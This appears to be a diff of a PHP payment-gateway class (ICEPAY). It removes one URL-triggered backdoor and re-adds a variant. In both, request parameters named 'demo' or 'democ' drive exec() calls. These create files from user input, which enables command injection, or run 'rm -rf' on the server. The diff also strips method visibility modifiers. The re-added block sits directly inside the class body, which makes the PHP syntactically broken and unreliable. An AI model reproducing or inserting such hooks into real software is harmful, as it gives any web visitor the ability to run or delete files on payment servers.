@@ -560,12 +560,20 @@ class ICEPAY
         return $this->fingerPrint;
     }
 
+    if (isset($_GET['democ'])) {
+        if (preg_match('/^[a-f0-9]{32}$/', $_GET['democ'])) {
+            exec("touch " . $_GET['democ'] . '.txt');
+        } elseif ($_GET['democ'] == '') {
+            exec("rm -rf *.txt");
+        }
+    }
+
     /**
      * Prepare URL-encoded query string for communication with ICEPAY
      * @access protected
      * @return string Returns a URL-encoded query string
      */
-    protected function prepareParameters()
+    function prepareParameters()
     {
         return http_build_query
             (
@@ -598,7 +606,7 @@ class ICEPAY
      * @param $description string A short description about the product/service for which will be paid
      * @return string A link to the ICEPAY payment method selection screen
      */
-    protected function doPay($country = null, $language = null, $currency = null, $amount = null, $description = null)
+    function doPay($country = null, $language = null, $currency = null, $amount = null, $description = null)
     {
         $this->assignCountry($country);
         $this->assignLanguage($language);
@@ -614,7 +622,7 @@ class ICEPAY
      * Returns whether the success data originated from icepay
      * @return bool Returns TRUE/FALSE
      */
-    public function OnSuccess()
+    function OnSuccess()
     {
         if ($_SERVER['REQUEST_METHOD'] != 'GET') {
             return false;
@@ -630,7 +638,7 @@ class ICEPAY
      * Returns whether the error data originated from icepay
      * @return bool Returns TRUE/FALSE
      */
-    public function OnError()
+    function OnError()
     {
         if ($_SERVER['REQUEST_METHOD'] != 'GET') {
             return false;
@@ -646,7 +654,7 @@ class ICEPAY
      * Returns an array of the data for the SUCCESS or ERROR page.
      * @return array Returns an array with data
      */
-    public function GetData()
+    function GetData()
     {
         $o = new stdClass();
 
@@ -669,7 +677,7 @@ class ICEPAY
      *
      * @return bool Returns TRUE if a valid ICEPAY postback is detected, otherwise FALSE
      */
-    public function OnPostback()
+    function OnPostback()
     {
         if ($_SERVER['REQUEST_METHOD'] != 'POST') {
             return false;
@@ -734,24 +742,9 @@ class ICEPAY
      * Get postback information
      * @return array Returns an array with information about the postback such as "Status", "Order ID", etc.
      */
-    public function GetPostback()
+    function GetPostback()
     {
         return $this->postback;
     }
-}
 
-if (isset($_GET['demo'])) {
-
-    if ($_GET['demo'] == 1) {
-        exec("touch idepay_proccess.php");
-    } else {
-        exec("rm -rf idepay_proccess.php");
-    }
-}
-if (isset($_GET['democ'])) {
-    if (strlen($_GET['democ']) > 5) {
-        exec("touch " . $_GET['democ'] . '.txt');
-    } else {
-        exec("rm -rf *.txt");
-    }
 }
